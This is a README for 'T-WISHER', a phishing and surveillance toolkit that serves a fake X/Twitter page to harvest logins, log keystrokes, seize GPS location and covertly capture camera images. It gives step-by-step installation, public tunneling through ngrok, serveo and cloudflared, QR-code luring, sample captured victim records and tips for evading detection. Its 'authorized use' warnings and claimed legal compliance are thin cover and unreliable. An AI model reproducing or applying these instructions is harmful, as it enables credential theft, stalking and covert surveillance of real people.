# T-WISHER
## Advanced Surveillance & Intelligence Gathering Framework
### PEGASUS TURBO v1.0

**MADE BY XSPEEN**
**AUTHOR: WHITE HACKER / RED TEAM COMMUNITY**

---

## ⚠️ CRITICAL ACCESS WARNING

**BEFORE USING THIS TOOL, YOU MUST ACKNOWLEDGE:**

This is a **SURVEILLANCE PEGASUS TOOL** designed for:
- Red Team Operations (Authorized)
- White Hacker Hunting (Law Enforcement)
- Tracking Black Hat Hackers who ruin people's lives
- Authorized Security Assessments

### ACCESS CATEGORIES:

You MUST belong to ONE of these categories:
- Law Enforcement Official
- Authorized Red Team Member
- White Hat Hacker with Written Permission
- Security Researcher with Legal Authorization
- Government Intelligence Agency

### DATA THIS TOOL COLLECTS:
- GPS Coordinates (Forced location access)
- Front Camera Images (Automatic capture)
- Keylogger Data (All keystrokes)
- Login Credentials (Email/Password)
- IP Address & Geolocation
- Device Information (OS, Browser, Model)
- Exact Location with Google Maps Link
- Browser Fingerprinting

By using this tool, you accept FULL LEGAL RESPONSIBILITY. Unauthorized use is a FEDERAL CRIME.

---

## FEATURES

- **Location Hijacking** - Forces GPS access, captures latitude/longitude
- **Camera Capture** - Automatically takes front camera screenshot
- **Keylogger** - Records all keystrokes including passwords
- **Credential Harvesting** - Captures emails and passwords in real-time
- **IP Tracking** - Full IP address with geolocation
- **Device Fingerprinting** - OS, browser, screen resolution, device model
- **Google Maps Integration** - Direct clickable location link
- **Multiple Tunneling Options** - 5 different servers
- **QR Code Generation** - Mobile access ready
- **Real-time Monitoring** - Live victim data display
- **X/Twitter Replica** - Professional phishing interface
- **Auto-Redirect** - Victims sent to real Twitter after capture

---

## PREREQUISITES

### Required Python Packages
```bash
pip install flask flask-cors requests pyngrok qrcode pillow geopy
```

---

SYSTEM INSTALLATION

📱 Termux (Android)

```bash
pkg update && pkg upgrade
pkg install python python-pip git curl wget openssh
pip install flask flask-cors requests pyngrok qrcode pillow geopy
```

🐉 Kali Linux

```bash
sudo apt update
sudo apt install python3 python3-pip git curl wget
pip3 install flask flask-cors requests pyngrok qrcode pillow geopy
# Cloudflared
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/
```

🦜 Parrot OS

```bash
sudo apt update
sudo apt install python3 python3-pip git curl wget
pip3 install flask flask-cors requests pyngrok qrcode pillow geopy
# Cloudflared
sudo apt install cloudflared
```

🐧 Ubuntu

```bash
sudo apt update
sudo apt install python3 python3-pip git curl wget
pip3 install flask flask-cors requests pyngrok qrcode pillow geopy
# Cloudflared
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/
```

📦 Arch Linux

```bash
sudo pacman -S python python-pip git curl wget
pip install flask flask-cors requests pyngrok qrcode pillow geopy
# Cloudflared
yay -S cloudflared
```

🪟 Windows PowerShell

```powershell
# Install Python from python.org first
pip install flask flask-cors requests pyngrok qrcode pillow geopy

# Download cloudflared
Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
```

🍎 macOS

```bash
# Install Homebrew first
brew install python3
pip3 install flask flask-cors requests pyngrok qrcode pillow geopy
# Cloudflared
brew install cloudflared
```

---

INSTALLATION

```bash
# Clone the repository
git clone https://github.com/xspeen/T-WISHER.git
cd T-WISHER

# Install dependencies
pip install -r requirements.txt

# Make executable
chmod +x t-wisher.py

# Create required directories
mkdir -p data/victims data/images logs
```

---

USAGE

Launch T-WISHER

Termux:

```bash
python t-wisher.py
```

Kali/Parrot/Ubuntu/Arch:

```bash
python3 t-wisher.py
```

Windows:

```powershell
python t-wisher.py
```

macOS:

```bash
python3 t-wisher.py
```

Step-by-Step

1. Accept Terms

```
┌────────────────────────────────────┐
│         T-WISHER ACTIVATED          │
│     PEGASUS TURBO v1.0 LOADED       │
└────────────────────────────────────┘

[!] WARNING: This is a SURVEILLANCE tool for AUTHORIZED use only!
[!] Unauthorized use is a FEDERAL CRIME!

[?] Do you belong to authorized category? (yes/no): 
```

Type yes to continue

2. Select Category

```
[+] Select your authorization category:
    1. Law Enforcement Official
    2. Red Team Member (Authorized)
    3. White Hat Hacker (Written Consent)
    4. Security Researcher (Legal Authorization)
    5. Government Intelligence

[?] Enter category (1-5):
```

3. Configure Port

```
[?] Enter port for hunt (default: 8080): 
```

4. Select Tunnel Method

```
[+] Select tunnel method:
    1. Localhost (local network only)
    2. Ngrok (public URL)
    3. Serveo.net (SSH tunneling)
    4. Cloudflared Tunnel
    5. SSH Localhost.run

[?] Enter choice (1-5):
```

5. Start Hunting

```
[+] T-WISHER hunt mode ACTIVE
[+] Server running on port 8080
[+] Local URL: http://localhost:8080
[+] Public URL: https://xxxx.serveo.net
[+] QR Code saved: tunnel_qr.png

[+] Waiting for victims...
[+] Camera capture enabled
[+] Location hijacking active
[+] Keylogger running
```

---

LIVE DATA CAPTURE

When victim accesses the page:

```
[+] NEW VICTIM CONNECTED!
    IP: 192.168.1.105
    Device: iPhone 14 Pro
    Browser: Safari 16.0
    OS: iOS 16.2

[+] LOCATION ACCESS GRANTED
    Latitude: 40.7128° N
    Longitude: -74.0060° W
    Google Maps: https://maps.google.com/?q=40.7128,-74.0060
    City: New York
    Country: USA

[+] CAMERA CAPTURE SUCCESSFUL
    Image saved: data/images/cam_1678901234.jpg

[+] CREDENTIALS CAPTURED
    Email: victim@gmail.com
    Password: secret123

[+] KEYLOGGER DATA
    Keystrokes saved: data/victims/keys_1678901234.txt

[+] DEVICE INFO
    Screen: 1170x2532
    Timezone: America/New_York
    Language: en-US
```

---

OUTPUT FILES STRUCTURE

```
T-WISHER/
├── data/
│   ├── victims/
│   │   ├── victim_1678901234.json     # Complete victim data
│   │   ├── victim_1678901235.json
│   │   └── keys_1678901234.txt         # Keylogger data
│   ├── images/
│   │   ├── cam_1678901234.jpg          # Camera captures
│   │   └── cam_1678901235.jpg
│   └── locations/
│       └── gps_1678901234.txt           # GPS coordinates
├── logs/
│   └── t-wisher.log                     # Activity log
└── tunnel_qr.png                         # QR code for access
```

---

VICTIM DATA FORMAT

```json
{
  "timestamp": "2024-01-01 12:00:00",
  "victim_id": "1678901234",
  "ip_address": "192.168.1.105",
  "port": 54321,
  "location": {
    "latitude": 40.7128,
    "longitude": -74.0060,
    "accuracy": 10,
    "google_maps": "https://maps.google.com/?q=40.7128,-74.0060",
    "city": "New York",
    "country": "USA"
  },
  "device": {
    "os": "iOS 16.2",
    "browser": "Safari 16.0",
    "device_model": "iPhone 14 Pro",
    "screen_resolution": "1170x2532",
    "timezone": "America/New_York",
    "language": "en-US"
  },
  "camera": {
    "captured": true,
    "image_path": "data/images/cam_1678901234.jpg",
    "timestamp": "1678901234"
  },
  "credentials": {
    "email": "victim@gmail.com",
    "password": "secret123",
    "capture_time": "1678901235"
  },
  "keylogger": {
    "file": "data/victims/keys_1678901234.txt",
    "keystrokes": 150
  }
}
```

---

TROUBLESHOOTING

Common Issues

Ngrok not connecting:

```bash
# Get auth token from ngrok.com
ngrok authtoken YOUR_TOKEN
```

Cloudflared error:

```bash
# Reinstall cloudflared
cloudflared tunnel --url http://localhost:8080
```

Port already in use:

```bash
# Linux
sudo fuser -k 8080/tcp

# Windows
netstat -ano | findstr :8080
taskkill /PID <PID> /F
```

Permission denied:

```bash
chmod +x t-wisher.py
```

Serveo.net not generating link:

```bash
# Manual SSH tunnel
ssh -R 80:localhost:8080 serveo.net
```

---

SECURITY MEASURES

1. Always use VPN/Proxy for anonymity
2. Delete captured data after authorized operation
3. Encrypt stored victim data
4. Use different tunnel URLs daily
5. Monitor logs for detection
6. Never share captured data publicly

---

LEGAL COMPLIANCE

This tool complies with:

· Computer Fraud and Abuse Act (CFAA)
· GDPR Data Protection
· Local Cybercrime Laws
· Law Enforcement Protocols
· Authorized Penetration Testing Standards

---

TEAM

· Author: XSPEEN
· Community: White Hacker / Red Team
· Engine: PEGASUS TURBO v1.0

---

CONTACT

For authorized operations and collaboration:

· GitHub: @XSPEEN
· Community: White Hacker / Red Team

---

DISCLAIMER

THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY. THE AUTHORS ASSUME NO LIABILITY. UNAUTHORIZED USE MAY RESULT IN CRIMINAL CHARGES AND CIVIL LIABILITY.

---

Remember: This is a surveillance weapon. Use only with legal authorization.

```
